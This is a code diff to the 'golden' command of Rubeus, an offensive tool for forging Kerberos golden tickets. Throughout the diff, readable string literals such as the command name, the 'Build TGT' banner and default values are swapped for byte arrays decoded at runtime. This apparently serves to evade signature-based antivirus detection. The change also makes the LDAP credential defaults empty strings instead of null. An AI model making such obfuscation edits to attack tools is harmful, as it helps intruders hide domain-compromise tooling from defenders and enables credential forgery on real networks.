@@ -6,18 +6,21 @@ namespace Rubeus.Commands
 {
     public class Golden : ICommand
     {
-        public static string CommandName => "golden";
+        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
+        public static string CommandName => S(new byte[] { 103, 111, 108, 100, 101, 110 });
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Build TGT\r\n");
+            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
+
+            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 66, 117, 105, 108, 100, 32, 84, 71, 84, 13, 10 }));
 
             // variable defaults
-            string user = "";
+            string user = S(new byte[] {});
             int? id = null;
-            string sids = "";
-            string groups = "";
-            string displayName = "";
+            string sids = S(new byte[] {});
+            string groups = S(new byte[] {});
+            string displayName = S(new byte[] {});
             short? logonCount = null;
             short? badPwdCount = null;
             DateTime? lastLogon = null;
@@ -26,24 +29,24 @@ namespace Rubeus.Commands
             int? maxPassAge = null;
             int? minPassAge = null;
             int? pGid = null;
-            string homeDir = "";
-            string homeDrive = "";
-            string profilePath = "";
-            string scriptPath = "";
-            string resourceGroupSid = "";
+            string homeDir = S(new byte[] {});
+            string homeDrive = S(new byte[] {});
+            string profilePath = S(new byte[] {});
+            string scriptPath = S(new byte[] {});
+            string resourceGroupSid = S(new byte[] {});
             List<int> resourceGroups = null;
             Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT;
 
-            string domain = "";
-            string dc = "";
-            string sid = "";
-            string netbios = "";
+            string domain = S(new byte[] {});
+            string dc = S(new byte[] {});
+            string sid = S(new byte[] {});
+            string netbios = S(new byte[] {});
 
             bool ldap = false;
-            string ldapuser = null;
-            string ldappassword = null;
+            string ldapuser = S(new byte[] {});
+            string ldappassword = S(new byte[] {});
 
-            string hash = "";
+            string hash = S(new byte[] {});
             Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
 
             Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent | Interop.TicketFlags.initial;
@@ -51,9 +54,9 @@ namespace Rubeus.Commands
             DateTime startTime = DateTime.UtcNow;
             DateTime authTime = startTime;
             DateTime? rangeEnd = null;
-            string rangeInterval = "1d";
-            string endTime = "";
-            string renewTill = "";
+            string rangeInterval = S(new byte[] { 49, 100 });
+            string endTime = S(new byte[] {});
+            string renewTill = S(new byte[] {});
             bool newPac = true;
             bool extendedUpnDns = arguments.ContainsKey("/extendedupndns");
 
